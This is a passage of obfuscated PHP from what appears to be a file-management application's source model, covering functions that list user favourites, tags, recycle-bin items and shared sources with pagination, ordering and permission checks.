foreach ($ßú½·ñ as $ø¡Ï¦ÉÓ) { if (in_array($ø¡Ï¦ÉÓ, $ÎÊÙçº)) { continue; } $ºÅÙãÂ‘[] = $ø¡Ï¦ÉÓ; } $éòŠ•¤  = explode($¬½ºüÌ–[50], $¬½ºüÌ–[416]); } foreach ($éòŠ•¤  as $¹Ñ‡çˆ ) { if (isset($çÈğ×”Ô[$¹Ñ‡çˆ ])) { $çÈğ×”Ô[$¹Ñ‡çˆ ] = intval($çÈğ×”Ô[$¹Ñ‡çˆ ]); } } $çÈğ×”Ô[$¬½ºüÌ–[84]] = $¬½ºüÌ–[417] . $çÈğ×”Ô[$¬½ºüÌ–[411]] . $¬½ºüÌ–[418]; $çÈğ×”Ô[$¬½ºüÌ–[33]] = $çÈğ×”Ô[$¬½ºüÌ–[419]] == 1 ? $¬½ºüÌ–[75] : $¬½ºüÌ–[199]; $çÈğ×”Ô[$¬½ºüÌ–[420]] = $this->typeName($çÈğ×”Ô[$¬½ºüÌ–[420]]); if ($çÈğ×”Ô[$¬½ºüÌ–[419]] != 1) { $çÈğ×”Ô[$¬½ºüÌ–[174]] = $çÈğ×”Ô[$¬½ºüÌ–[421]]; unset($çÈğ×”Ô[$¬½ºüÌ–[421]]); } $Ãğ¶Ï´¶ = $ßú½·ñ; if (isset($çÈğ×”Ô[$¬½ºüÌ–[422]]) && $çÈğ×”Ô[$¬½ºüÌ–[422]][$¬½ºüÌ–[423]] == -1) { $Ãğ¶Ï´¶ = $ºÅÙãÂ‘; } $çÈğ×”Ô = array_field_key($çÈğ×”Ô, $Ãğ¶Ï´¶); return $çÈğ×”Ô; } public function listUserFav() { $ïÖèÁ¢û =& $_SERVER[ĞÆÏ¡Îª]; $Ìßº‹š¤ = Model($ïÖèÁ¢û[424])->listData(); $Âè–™¥ê = array_filter_by_field($Ìßº‹š¤, $ïÖèÁ¢û[33], $ïÖèÁ¢û[425]); $Âè–™¥ê = array_to_keyvalue($Âè–™¥ê, $ïÖèÁ¢û[12], $ïÖèÁ¢û[84]); if ($Âè–™¥ê) { $‚‚ç©¸ = $this->listSource(array($ïÖèÁ¢û[426] => array($ïÖèÁ¢û[427], $Âè–™¥ê))); } $‚‚ç©¸ = array_to_keyvalue($‚‚ç©¸[$ïÖèÁ¢û[378]], $ïÖèÁ¢û[411]); foreach ($Ìßº‹š¤ as &$ãªĞÂ—) { $ãªĞÂ— = array($ïÖèÁ¢û[428] => $ãªĞÂ—[$ïÖèÁ¢û[407]], $ïÖèÁ¢û[429] => $ãªĞÂ—[$ïÖèÁ¢û[32]], $ïÖèÁ¢û[430] => $ãªĞÂ—[$ïÖèÁ¢û[84]], $ïÖèÁ¢û[431] => $ãªĞÂ—[$ïÖèÁ¢û[33]], $ïÖèÁ¢û[432] => $ãªĞÂ—[$ïÖèÁ¢û[200]], $ïÖèÁ¢û[433] => $ãªĞÂ—[$ïÖèÁ¢û[85]]); if ($ãªĞÂ—[$ïÖèÁ¢û[33]] == $ïÖèÁ¢û[425] && $‚‚ç©¸[$ãªĞÂ—[$ïÖèÁ¢û[84]]]) { $ãªĞÂ—[$ïÖèÁ¢û[86]] = $‚‚ç©¸[$ãªĞÂ—[$ïÖèÁ¢û[84]]]; } } unset($ãªĞÂ—); return $Ìßº‹š¤; } public function listUserTag($™Ë§˜˜) { $›•ºè¿– =& $_SERVER[ĞÆÏ¡Îª]; if ($™Ë§˜˜ && !is_array($™Ë§˜˜)) { $™Ë§˜˜ = array($™Ë§˜˜); } $Ïü²ÈˆÁ = Model($›•ºè¿–[434])->listData(); $ºû¥Îœ = array(); $Ñ²êºû = array(); foreach ($Ïü²ÈˆÁ as $’ûÌ—·é) { $ä¥ß¢ı = $’ûÌ—·é[$›•ºè¿–[84]]; if (!$ä¥ß¢ı) { continue; } if (!isset($Ñ²êºû[$ä¥ß¢ı])) { $Ñ²êºû[$ä¥ß¢ı] = array(); } $Ñ²êºû[$ä¥ß¢ı][] = $’ûÌ—·é[$›•ºè¿–[435]]; $ºû¥Îœ[$’ûÌ—·é[$›•ºè¿–[84]]] = $’ûÌ—·é; } $¶“–ğ÷É = array(); $´©¤Åµ = array(); $öçÙ¹• = array(); foreach ($Ñ²êºû as $ÛàÁµŞì => $…¤¦Î“¯) { $çùäñ– = !0; if (!$™Ë§˜˜) { $¶“–ğ÷É[] = $ÛàÁµŞì; continue; } foreach ($™Ë§˜˜ as $ï¥ßİ€¤) { if (!in_array($ï¥ßİ€¤, $…¤¦Î“¯)) { $çùäñ– = !1; break; } } if (!$çùäñ–) { continue; } if (!is_numeric($ÛàÁµŞì)) { $Ñ¦“â§› = $ºû¥Îœ[$ÛàÁµŞì]; $óÅê¥‚ = array($›•ºè¿–[32] => $Ñ¦“â§›[$›•ºè¿–[32]], $›•ºè¿–[84] => $Ñ¦“â§›[$›•ºè¿–[84]], $›•ºè¿–[33] => $Ñ¦“â§›[$›•ºè¿–[33]], $›•ºè¿–[86] => array($›•ºè¿–[436] => 1), $›•ºè¿–[201] => !0); if ($Ñ¦“â§›[$›•ºè¿–[33]] == $›•ºè¿–[199]) { $öçÙ¹•[] = $óÅê¥‚; } if ($Ñ¦“â§›[$›•ºè¿–[33]] == $›•ºè¿–[75]) { $´©¤Åµ[] = $óÅê¥‚; } continue; } $¶“–ğ÷É[] = $ÛàÁµŞì; } if ($¶“–ğ÷É) { $˜Ù¥¢– = $this->listSource(array($›•ºè¿–[426] => array($›•ºè¿–[427], $¶“–ğ÷É))); } $˜Ù¥¢– = $˜Ù¥¢– ? $˜Ù¥¢– : array($›•ºè¿–[82] => array(), $›•ºè¿–[83] => array()); $˜Ù¥¢–[$›•ºè¿–[82]] = array_merge($˜Ù¥¢–[$›•ºè¿–[82]], $´©¤Åµ); $˜Ù¥¢–[$›•ºè¿–[83]] = array_merge($˜Ù¥¢–[$›•ºè¿–[83]], $öçÙ¹•); if (isset($˜Ù¥¢–[$›•ºè¿–[375]]) && count($¶“–ğ÷É) == $˜Ù¥¢–[$›•ºè¿–[375]][$›•ºè¿–[376]]) { return $˜Ù¥¢–; } $Ğ¶“û¿Û = array(); $Ç´¨­¹Á = array_to_keyvalue($˜Ù¥¢–[$›•ºè¿–[82]], $›•ºè¿–[12], $›•ºè¿–[411]); $ß“Ÿòƒ† = array_to_keyvalue($˜Ù¥¢–[$›•ºè¿–[83]], $›•ºè¿–[12], $›•ºè¿–[411]); $–§‘±ã = array_merge($ß“Ÿòƒ†, $Ç´¨­¹Á); foreach ($¶“–ğ÷É as $ä¥ß¢ı) { if (!in_array($ä¥ß¢ı, $–§‘±ã)) { $Ğ¶“û¿Û[] = $ä¥ß¢ı; } } if ($Ğ¶“û¿Û) { Model($›•ºè¿–[437])->removeBySource($Ğ¶“û¿Û); } return $˜Ù¥¢–; } public function listUserRecycle() { $ë’ğĞØ =& $_SERVER[ĞÆÏ¡Îª]; $Æ¨µ„›” = Model($ë’ğĞØ[438])->listData(); if (!$Æ¨µ„›”) { return array(); } $œ²˜µË = array($ë’ğĞØ[426] => array($ë’ğĞØ[427], $Æ¨µ„›”), $ë’ğĞØ[439] => 1); return $this->listSource($œ²˜µË); } public function listSource($›ÙÀ¬÷, $ï„”´ÖÉ = 3000, $»¶Ò» = false) { $ï²›…‹º =& $_SERVER[ĞÆÏ¡Îª]; if (!isset($›ÙÀ¬÷[$ï²›…‹º[440]])) { $›ÙÀ¬÷[$ï²›…‹º[440]] = 0; } if (isset($›ÙÀ¬÷[$ï²›…‹º[441]]) && $›ÙÀ¬÷[$ï²›…‹º[441]] == $ï²›…‹º[197]) { $›ÙÀ¬÷[$ï²›…‹º[421]] = array($ï²›…‹º[340], $ï²›…‹º[442]); } $š‡§–œ§ = $ï²›…‹º[443]; $ö×©ĞöÁ = $this->field($š‡§–œ§)->_makeOrder()->where($›ÙÀ¬÷)->selectPage($ï„”´ÖÉ); $this->_listPageCheck($ö×©ĞöÁ, $š‡§–œ§, $›ÙÀ¬÷); $this->_listDataApply($ö×©ĞöÁ[$ï²›…‹º[378]], $»¶Ò»); $this->_listMake($ö×©ĞöÁ); return $ö×©ĞöÁ; } private function _listPageCheck(&$ŠœıÚÃá, $ú™‚ô—Ê, $¸ÅÖÊÛ¼) { $ÒÊó€î =& $_SERVER[ĞÆÏ¡Îª]; if (!is_array($ŠœıÚÃá[$ÒÊó€î[375]])) { return; } $œíãºİò = $ŠœıÚÃá[$ÒÊó€î[375]]; if ($œíãºİò[$ÒÊó€î[377]] <= 1) { return; } if ($œíãºİò[$ÒÊó€î[376]] >= 100000) { return; } if (Model($ÒÊó€î[444])->get($ÒÊó€î[445]) != $ÒÊó€î[446]) { return; } $ú™‚ô—Ê = str_replace(array($ÒÊó€î[53], $ÒÊó€î[351], $ÒÊó€î[231]), $ÒÊó€î[12], $ú™‚ô—Ê); $ú™‚ô—Ê = $ÒÊó€î[447] . str_replace($ÒÊó€î[50], $ÒÊó€î[448], $ú™‚ô—Ê) . $ÒÊó€î[449]; $½ñÈ³Ø = $ÒÊó€î[450]; $½ñÈ³Ø = $½ñÈ³Ø . $ÒÊó€î[451]; $û•ıÙÛ° = $œíãºİò[$ÒÊó€î[372]] * ($œíãºİò[$ÒÊó€î[362]] - 1) . $ÒÊó€î[50] . $œíãºİò[$ÒÊó€î[372]]; $ô‚ÁæòÇ = $this->_makeOrder(!0); $¶áÆ¦¡ = $ÒÊó€î[447] . str_replace($ÒÊó€î[50], $ÒÊó€î[448], $ô‚ÁæòÇ[0]); if (strpos($¶áÆ¦¡, $ÒÊó€î[452])) { $¶áÆ¦¡ = str_replace($ÒÊó€î[452], $ÒÊó€î[453], $¶áÆ¦¡); } else { $¶áÆ¦¡ .= $ÒÊó€î[454] . $ô‚ÁæòÇ[1]; } $Ã¡»ëÏ’ = array(); foreach ($¸ÅÖÊÛ¼ as $äÈÀüéı => $É°’Âµ) { $Ã¡»ëÏ’[$ÒÊó€î[447] . $äÈÀüéı] = $É°’Âµ; } $this->alias($ÒÊó€î[455])->field($ú™‚ô—Ê)->limit($û•ıÙÛ°)->order($¶áÆ¦¡); $åœ»×Îà = $this->join($½ñÈ³Ø)->where($Ã¡»ëÏ’)->select(); if ($åœ»×Îà) { $ŠœıÚÃá[$ÒÊó€î[378]] = $åœ»×Îà; } } protected function _makeOrder($íË®¢õÁ = false) { $È™¯¼…Ô =& $_SERVER[ĞÆÏ¡Îª]; $‘Å ı£¾ = Model($È™¯¼…Ô[456])->get($È™¯¼…Ô[457]); $µ•ÈÙÑ = Model($È™¯¼…Ô[456])->get($È™¯¼…Ô[458]); $¼Ú´’Êï = array($È™¯¼…Ô[459] => $È™¯¼…Ô[460], $È™¯¼…Ô[461] => $È™¯¼…Ô[462]); $ÓóÃûÛˆ = array($È™¯¼…Ô[32] => $È™¯¼…Ô[32], $È™¯¼…Ô[76] => $È™¯¼…Ô[76], $È™¯¼…Ô[174] => $È™¯¼…Ô[421], $È™¯¼…Ô[463] => $È™¯¼…Ô[463], $È™¯¼…Ô[464] => $È™¯¼…Ô[465], $È™¯¼…Ô[200] => $È™¯¼…Ô[200], $È™¯¼…Ô[85] => $È™¯¼…Ô[85]); $ –³ûåµ = Input::get($È™¯¼…Ô[466], $È™¯¼…Ô[7], $‘Å ı£¾, array_keys($ÓóÃûÛˆ)); $¤‚•Å§ = Input::get($È™¯¼…Ô[467], $È™¯¼…Ô[7], $µ•ÈÙÑ, array_keys($¼Ú´’Êï)); if (!in_array($ –³ûåµ, array_keys($ÓóÃûÛˆ))) { $ –³ûåµ = $È™¯¼…Ô[32]; } if (!in_array($¤‚•Å§, array_keys($¼Ú´’Êï))) { $ –³ûåµ = $È™¯¼…Ô[459]; } if ($ –³ûåµ == $È™¯¼…Ô[32]) { } $¥Ûú˜ºÖ = $È™¯¼…Ô[468] . $ÓóÃûÛˆ[$ –³ûåµ] . $È™¯¼…Ô[53] . $¼Ú´’Êï[$¤‚•Å§]; $¥Ûú˜ºÖ = rtrim(trim($¥Ûú˜ºÖ), $È™¯¼…Ô[50]); if ($íË®¢õÁ) { return array($¥Ûú˜ºÖ, $¼Ú´’Êï[$¤‚•Å§]); } return $this->order($¥Ûú˜ºÖ); } protected function _listDataApplyItem($í¶¤¥â, $ÀÜè¢»ò = false) { $¼èÁÆô = array($í¶¤¥â); $this->_listDataApply($¼èÁÆô, $ÀÜè¢»ò); return $¼èÁÆô[0]; } protected function _listDataApply(&$±ÆïÃ‘, $òí»ıãù = false) { $Äâ•¡“ø =& $_SERVER[ĞÆÏ¡Îª]; if (!$±ÆïÃ‘) { $±ÆïÃ‘ = array(); return; } $Íú¥ŠÚ = array_to_keyvalue($±ÆïÃ‘, $Äâ•¡“ø[12], $Äâ•¡“ø[411]); $Íú¥ŠÚ = array_unique($Íú¥ŠÚ); $this->_listSourceCache($±ÆïÃ‘); if (!$òí»ıãù) { $this->_listAppendMeta($±ÆïÃ‘, $Íú¥ŠÚ); $this->_listAppendFileMeta($±ÆïÃ‘, $Íú¥ŠÚ); $this->_listAppendChildren($±ÆïÃ‘, $Íú¥ŠÚ); } $this->_listAppendPath($±ÆïÃ‘); $this->_listAppendAuth($±ÆïÃ‘); $this->_listAppendSourceInfo($±ÆïÃ‘, $Íú¥ŠÚ); $this->_listAppendUser($±ÆïÃ‘); $this->_listFilterInfo($±ÆïÃ‘, $òí»ıãù); $this->_listAppendAuthSecret($±ÆïÃ‘); } protected function _listSourceCache($ÔıÜ÷šŞ) { $¬ä¯Šá¼ =& $_SERVER[ĞÆÏ¡Îª]; foreach ($ÔıÜ÷šŞ as $«¶µæØà) { self::$cacheSourceInfo[$¬ä¯Šá¼[469] . $«¶µæØà[$¬ä¯Šá¼[411]]] = $«¶µæØà; } } protected function _listFilterInfo(&$öâã„à, $»°¬àÇ = false) { $Ì«ÍıŸß =& $_SERVER[ĞÆÏ¡Îª]; foreach ($öâã„à as &$·›Å°²ù) { $·›Å°²ù = $this->pathInfoFilter($·›Å°²ù); self::$cachePathInfo[$Ì«ÍıŸß[470] . intval($»°¬àÇ) . $Ì«ÍıŸß[394] . $·›Å°²ù[$Ì«ÍıŸß[411]]] = $·›Å°²ù; } unset($·›Å°²ù); } protected function _listMake(&$›Œ´Âù£) { $Â¡¶ƒ’ =& $_SERVER[ĞÆÏ¡Îª]; $›Œ´Âù£[$Â¡¶ƒ’[82]] = array(); $›Œ´Âù£[$Â¡¶ƒ’[83]] = array(); foreach ($›Œ´Âù£[$Â¡¶ƒ’[378]] as $Ûáà™ˆˆ) { $ŒÅÏŒ¿ı = $Ûáà™ˆˆ[$Â¡¶ƒ’[419]] == 1 ? $Â¡¶ƒ’[82] : $Â¡¶ƒ’[83]; $›Œ´Âù£[$ŒÅÏŒ¿ı][] = $Ûáà™ˆˆ; } unset($›Œ´Âù£[$Â¡¶ƒ’[378]]); } protected function _listAppendMeta(&$‘²úÏ–ã, $óË¯Óğæ) { $ª‹ŸÎä÷ =& $_SERVER[ĞÆÏ¡Îª]; $—­ñÊå = array($ª‹ŸÎä÷[426] => array($ª‹ŸÎä÷[427], $óË¯Óğæ)); $®ìÚèÆ² = Model($ª‹ŸÎä÷[471])->field($ª‹ŸÎä÷[472])->where($—­ñÊå)->select(); if (!$®ìÚèÆ²) { return; } $ëü£ÂÅ¿ = array($ª‹ŸÎä÷[473], $ª‹ŸÎä÷[474], $ª‹ŸÎä÷[453]); $­˜èÍÕ = array(); foreach ($®ìÚèÆ² as $©»¡¾³Û) { if (!isset($­˜èÍÕ[$©»¡¾³Û[$ª‹ŸÎä÷[411]]])) { $­˜èÍÕ[$©»¡¾³Û[$ª‹ŸÎä÷[411]]] = array(); } if (in_array($©»¡¾³Û[$ª‹ŸÎä÷[94]], $ëü£ÂÅ¿)) { continue; } $­˜èÍÕ[$©»¡¾³Û[$ª‹ŸÎä÷[411]]][$©»¡¾³Û[$ª‹ŸÎä÷[94]]] = $©»¡¾³Û[$ª‹ŸÎä÷[383]]; } foreach ($‘²úÏ–ã as &$­«†ÂĞ—) { $­«†ÂĞ—[$ª‹ŸÎä÷[475]] = !1; if (isset($­˜èÍÕ[$­«†ÂĞ—[$ª‹ŸÎä÷[411]]])) { $­«†ÂĞ—[$ª‹ŸÎä÷[475]] = $­˜èÍÕ[$­«†ÂĞ—[$ª‹ŸÎä÷[411]]]; } if ($this->fileIsLock($­«†ÂĞ—) && $­«†ÂĞ—[$ª‹ŸÎä÷[422]]) { $ı­‡ÜÓ© = AuthModel::AUTH_EDIT | AuthModel::AUTH_REMOVE; $­«†ÂĞ—[$ª‹ŸÎä÷[422]][$ª‹ŸÎä÷[423]] = AuthModel::authDisable($­«†ÂĞ—[$ª‹ŸÎä÷[422]][$ª‹ŸÎä÷[423]], $ı­‡ÜÓ©); $­«†ÂĞ—[$ª‹ŸÎä÷[422]][$ª‹ŸÎä÷[476]][$ª‹ŸÎä÷[422]] = $­«†ÂĞ—[$ª‹ŸÎä÷[422]][$ª‹ŸÎä÷[423]]; } } unset($­«†ÂĞ—); } protected function _listAppendFileMeta(&$¨Ü»´É¹, $Â°ğúåÖ) { $­Î¸úĞ´ =& $_SERVER[ĞÆÏ¡Îª]; $îíÕÒ©é = array_to_keyvalue($¨Ü»´É¹, $­Î¸úĞ´[12], $­Î¸úĞ´[477]); $îíÕÒ©é = array_filter(array_unique($îíÕÒ©é)); if (!$îíÕÒ©é) { return; } $˜À³Ôõ½ = array($­Î¸úĞ´[478] => array($­Î¸úĞ´[427], $îíÕÒ©é)); $º‡éŸĞº = $­Î¸úĞ´[479]; $ŞÈûŠƒ = Model($­Î¸úĞ´[480])->field($º‡éŸĞº)->where($˜À³Ôõ½)->select(); $ŞÈûŠƒ = array_to_keyvalue($ŞÈûŠƒ, $­Î¸úĞ´[477]); $­Óš‘¾ = Model($­Î¸úĞ´[481])->field($­Î¸úĞ´[482])->where($˜À³Ôõ½)->select(); $­Óš‘¾ = $­Óš‘¾ ? $­Óš‘¾ : array(); $£×ª÷íã = array(); foreach ($­Óš‘¾ as $³ñ•½¨¿) { if (!isset($£×ª÷íã[$³ñ•½¨¿[$­Î¸úĞ´[477]]])) { $£×ª÷íã[$³ñ•½¨¿[$­Î¸úĞ´[477]]] = array(); } $£×ª÷íã[$³ñ•½¨¿[$­Î¸úĞ´[477]]][$³ñ•½¨¿[$­Î¸úĞ´[94]]] = $³ñ•½¨¿[$­Î¸úĞ´[383]]; } foreach ($¨Ü»´É¹ as &$ùÁ¯´Ò) { $Ê¶É¥©¸ = $ùÁ¯´Ò[$­Î¸úĞ´[477]]; if (!$Ê¶É¥©¸ || !is_array($ŞÈûŠƒ[$Ê¶É¥©¸])) { continue; } $Ìß°Çû = $ŞÈûŠƒ[$Ê¶É¥©¸]; $Ìß°Çû[$­Î¸úĞ´[76]] = $ùÁ¯´Ò[$­Î¸úĞ´[76]]; $Ìß°Çû[$­Î¸úĞ´[32]] = $ùÁ¯´Ò[$­Î¸úĞ´[32]]; if (!isset(self::$cacheFileInfo[$­Î¸úĞ´[483] . $Ê¶É¥©¸])) { self::$cacheFileInfo[$­Î¸úĞ´[483] . $Ê¶É¥©¸] = array_merge(array(), $Ìß°Çû); } unset($ŞÈûŠƒ[$Ê¶É¥©¸][$­Î¸úĞ´[84]]); $¯­ó…å = is_array($£×ª÷íã[$Ê¶É¥©¸]) ? $£×ª÷íã[$Ê¶É¥©¸] : array(); $ùÁ¯´Ò[$­Î¸úĞ´[170]] = array_merge($¯­ó…å, $ŞÈûŠƒ[$Ê¶É¥©¸]); if (isset($ùÁ¯´Ò[$­Î¸úĞ´[170]][$­Î¸úĞ´[169]])) { $ùÁ¯´Ò[$­Î¸úĞ´[169]] = json_decode($ùÁ¯´Ò[$­Î¸úĞ´[170]][$­Î¸úĞ´[169]], !0); unset($ùÁ¯´Ò[$­Î¸úĞ´[170]][$­Î¸úĞ´[169]]); } } unset($ùÁ¯´Ò); } protected function _listAppendSourceInfo(&$ıÌä†éŒ, $Ôİ¡Ã–’) { $‚ôó¶¥¬ =& $_SERVER[ĞÆÏ¡Îª]; if (!defined($‚ôó¶¥¬[484])) { return; } $óûì§†ê = Model($‚ôó¶¥¬[485])->listData(); $ è×ôö„ = Model($‚ôó¶¥¬[434])->listData(); $—İõà‰Ï = Model($‚ôó¶¥¬[424])->listData(); $ç­ì—‘ğ = Model($‚ôó¶¥¬[486])->listSimple(); $ç‰ùÁèÁ = array_to_keyvalue($óûì§†ê, $‚ôó¶¥¬[407]); $¢»‡À½ø = array_to_keyvalue_group($ è×ôö„, $‚ôó¶¥¬[84], $‚ôó¶¥¬[435]); $¶ŸÆ‹ï = array_to_keyvalue($—İõà‰Ï, $‚ôó¶¥¬[84]); $ùÀØ×ˆ¿ = array_to_keyvalue_group($ç­ì—‘ğ, $‚ôó¶¥¬[411]); foreach ($ıÌä†éŒ as &$Ó­íì—) { $Ó­íì—[$‚ôó¶¥¬[86]] = array($‚ôó¶¥¬[487] => 0, $‚ôó¶¥¬[488] => 0, $‚ôó¶¥¬[489] => 0); if (isset($¶ŸÆ‹ï[$Ó­íì—[$‚ôó¶¥¬[411]]])) { $Ó­íì—[$‚ôó¶¥¬[86]][$‚ôó¶¥¬[490]] = 1; $Ó­íì—[$‚ôó¶¥¬[86]][$‚ôó¶¥¬[491]] = $¶ŸÆ‹ï[$Ó­íì—[$‚ôó¶¥¬[411]]][$‚ôó¶¥¬[32]]; } if ($¢»‡À½ø && $ç‰ùÁèÁ && isset($¢»‡À½ø[$Ó­íì—[$‚ôó¶¥¬[411]]])) { $Ó­íì—[$‚ôó¶¥¬[86]][$‚ôó¶¥¬[492]] = array(); foreach ($¢»‡À½ø[$Ó­íì—[$‚ôó¶¥¬[411]]] as $¿ÑÆŒµÅ) { $ó‡’šúÑ = $ç‰ùÁèÁ[$¿ÑÆŒµÅ]; $Ó­íì—[$‚ôó¶¥¬[86]][$‚ôó¶¥¬[492]][] = array($‚ôó¶¥¬[493] => $ó‡’šúÑ[$‚ôó¶¥¬[407]], $‚ôó¶¥¬[429] => $ó‡’šúÑ[$‚ôó¶¥¬[32]], $‚ôó¶¥¬[494] => $ó‡’šúÑ[$‚ôó¶¥¬[495]]); } } if ($ùÀØ×ˆ¿ && isset($ùÀØ×ˆ¿[$Ó­íì—[$‚ôó¶¥¬[411]]])) { $Ó­íì—[$‚ôó¶¥¬[86]][$‚ôó¶¥¬[496]] = array(); foreach ($ùÀØ×ˆ¿[$Ó­íì—[$‚ôó¶¥¬[411]]] as $ùšÙŒ¯) { $Ó­íì—[$‚ôó¶¥¬[86]][$‚ôó¶¥¬[496]] = array($‚ôó¶¥¬[497] => $ùšÙŒ¯[$‚ôó¶¥¬[498]], $‚ôó¶¥¬[499] => $ùšÙŒ¯[$‚ôó¶¥¬[500]], $‚ôó¶¥¬[501] => $ùšÙŒ¯[$‚ôó¶¥¬[411]], $‚ôó¶¥¬[502] => $ùšÙŒ¯[$‚ôó¶¥¬[503]], $‚ôó¶¥¬[504] => $ùšÙŒ¯[$‚ôó¶¥¬[505]], $‚ôó¶¥¬[506] => $ùšÙŒ¯[$‚ôó¶¥¬[506]], $‚ôó¶¥¬[507] => $ùšÙŒ¯[$‚ôó¶¥¬[507]]); } } } unset($Ó­íì—); return $ıÌä†éŒ; } protected function _listAppendChildren(&$ÄĞıË±ñ, $ÎÕôĞûš) { $¶ÓÇø’Ä =& $_SERVER[ĞÆÏ¡Îª]; $ìˆÒ±À£ = array(); $£á°ËìÓ = array($¶ÓÇø’Ä[207] => 0, $¶ÓÇø’Ä[208] => 0); foreach ($ÄĞıË±ñ as &$„íĞ³®¤) { if (!$„íĞ³®¤[$¶ÓÇø’Ä[419]]) { continue; } $ìˆÒ±À£[] = $„íĞ³®¤[$¶ÓÇø’Ä[411]]; } unset($„íĞ³®¤); if (!$ìˆÒ±À£) { return; } $ĞÒ˜’¯ = array($¶ÓÇø’Ä[441] => array($¶ÓÇø’Ä[7], $ìˆÒ±À£), $¶ÓÇø’Ä[440] => 0); $Ş¸•àÃæ = array($¶ÓÇø’Ä[441], $¶ÓÇø’Ä[419], $¶ÓÇø’Ä[508] => $¶ÓÇø’Ä[509]); $¶¤˜’Ë = $this->field($Ş¸•àÃæ)->where($ĞÒ˜’¯)->group($¶ÓÇø’Ä[510])->select(); $«ƒÅ¨œ  = array(); foreach ($¶¤˜’Ë as $§âÖ’µ„) { $…êüŞœÖ = $§âÖ’µ„[$¶ÓÇø’Ä[441]]; $â¤ˆşßé = $§âÖ’µ„[$¶ÓÇø’Ä[419]] == $¶ÓÇø’Ä[88] ? $¶ÓÇø’Ä[208] : $¶ÓÇø’Ä[207]; if (!isset($«ƒÅ¨œ [$…êüŞœÖ])) { $«ƒÅ¨œ [$…êüŞœÖ] = array($¶ÓÇø’Ä[207] => 0, $¶ÓÇø’Ä[208] => 0); } $«ƒÅ¨œ [$…êüŞœÖ][$â¤ˆşßé] += $§âÖ’µ„[$¶ÓÇø’Ä[509]]; } foreach ($ÄĞıË±ñ as &$„íĞ³®¤) { if (!$„íĞ³®¤[$¶ÓÇø’Ä[419]]) { continue; } $ñàÊàÌã = is_array($«ƒÅ¨œ [$„íĞ³®¤[$¶ÓÇø’Ä[411]]]) ? $«ƒÅ¨œ [$„íĞ³®¤[$¶ÓÇø’Ä[411]]] : $£á°ËìÓ; $„íĞ³®¤[$¶ÓÇø’Ä[208]] = $ñàÊàÌã[$¶ÓÇø’Ä[208]]; $„íĞ³®¤[$¶ÓÇø’Ä[207]] = $ñàÊàÌã[$¶ÓÇø’Ä[207]]; unset($„íĞ³®¤[$¶ÓÇø’Ä[421]]); } unset($„íĞ³®¤); } protected function _listAppendAuth(&$ìÚÄšÂõ) { $Òæ—¨Ã’ =& $_SERVER[ĞÆÏ¡Îª]; if (!defined($Òæ—¨Ã’[484])) { return; } $¿Šñ¥‘¤ = array(); foreach ($ìÚÄšÂõ as $Ê¿êì) { if ($Ê¿êì[$Òæ—¨Ã’[420]] == self::TYPE_GROUP) { $¿Šñ¥‘¤[] = $Ê¿êì[$Òæ—¨Ã’[411]]; } } if (!$¿Šñ¥‘¤) { return; } $ù Õ‰Æì = array_to_keyvalue($ìÚÄšÂõ, $Òæ—¨Ã’[411]); $›å‹Ÿ—— = Model($Òæ—¨Ã’[511])->getSourceList($¿Šñ¥‘¤, $ù Õ‰Æì); $Îü‰¿‰ = $GLOBALS[$Òæ—¨Ã’[512]] == 1; foreach ($ìÚÄšÂõ as $¬üÀîÆº => &$Ê¿êì) { $Ê¿êì[$Òæ—¨Ã’[422]] = $›å‹Ÿ——[$Ê¿êì[$Òæ—¨Ã’[411]]]; if (!$Ê¿êì[$Òæ—¨Ã’[422]] && $Ê¿êì[$Òæ—¨Ã’[420]] == self::TYPE_GROUP) { $Ê¿êì[$Òæ—¨Ã’[422]] = Action($Òæ—¨Ã’[513])->pathGroupAuthMake($Ê¿êì[$Òæ—¨Ã’[514]]); if (!$Ê¿êì[$Òæ—¨Ã’[422]] && !$Îü‰¿‰) { $Ê¿êì[$Òæ—¨Ã’[202]] = !1; $Ê¿êì[$Òæ—¨Ã’[201]] = !1; } } if ($Ê¿êì[$Òæ—¨Ã’[422]]) { $Ê¿êì[$Òæ—¨Ã’[202]] = AuthModel::authCheckEdit($Ê¿êì[$Òæ—¨Ã’[422]][$Òæ—¨Ã’[423]]); $Ê¿êì[$Òæ—¨Ã’[201]] = AuthModel::authCheckView($Ê¿êì[$Òæ—¨Ã’[422]][$Òæ—¨Ã’[423]]); } $this->groupPathDisplay($Ê¿êì); } unset($Ê¿êì); } public function _listAppendAuthSecret(&$®î±Ğ ) { $ï£øëéÕ =& $_SERVER[ĞÆÏ¡Îª]; if (Model($ï£øëéÕ[444])->get($ï£øëéÕ[515]) != $ï£øëéÕ[88]) { return; } static $òû â³Á = false; if (!$òû â³Á) { $÷÷õİ›î = Model($ï£øëéÕ[516]); $Ö••§Å¾ = Model($ï£øëéÕ[517]); $òû â³Á = $Ö••§Å¾->listData(); $òû â³Á = array_to_keyvalue($òû â³Á, $ï£øëéÕ[411]); $®ä·ÚúÛ = json_decode(Model($ï£øëéÕ[444])->get($ï£øëéÕ[518]), !0); $®ä·ÚúÛ = array_to_keyvalue($®ä·ÚúÛ, $ï£øëéÕ[407]); foreach ($òû â³Á as $ÚïíæÚÜ => $ñ®ĞÏ«ë) { $ğÚçÔ†ë = $®ä·ÚúÛ[$ñ®ĞÏ«ë[$ï£øëéÕ[519]]]; if (!$ğÚçÔ†ë) { $Ö••§Å¾->remove($ñ®ĞÏ«ë[$ï£øëéÕ[407]]); unset($òû â³Á[$ÚïíæÚÜ]); continue; } $â£´İõÉ = $÷÷õİ›î->listData($ğÚçÔ†ë[$ï£øëéÕ[422]]); if (!$â£´İõÉ) { $Ö••§Å¾->remove($ñ®ĞÏ«ë[$ï£øëéÕ[407]]); unset($òû â³Á[$ÚïíæÚÜ]); continue; } $ñ®ĞÏ«ë[$ï£øëéÕ[422]] = $â£´İõÉ; $ñ®ĞÏ«ë[$ï£øëéÕ[520]] = $ğÚçÔ†ë; $ñ®ĞÏ«ë[$ï£øëéÕ[521]] = Model($ï£øëéÕ[522])->getInfoSimpleOuter($ñ®ĞÏ«ë[$ï£øëéÕ[463]]); $òû â³Á[$ÚïíæÚÜ] = $ñ®ĞÏ«ë; } } $ïËîİÒ = defined($ï£øëéÕ[523]) ? USER_ID : $ï£øëéÕ[12]; $¼îô…ë¨ = array(); $ò‹¢Øˆè = $this->_listAppendPath($¼îô…ë¨, !0); foreach ($®î±Ğ  as $ÚïíæÚÜ => &$ñ®ĞÏ«ë) { if (!is_array($ñ®ĞÏ«ë[$ï£øëéÕ[422]])) { continue; } if ($ñ®ĞÏ«ë[$ï£øëéÕ[420]] != $ï£øëéÕ[524]) { continue; } if 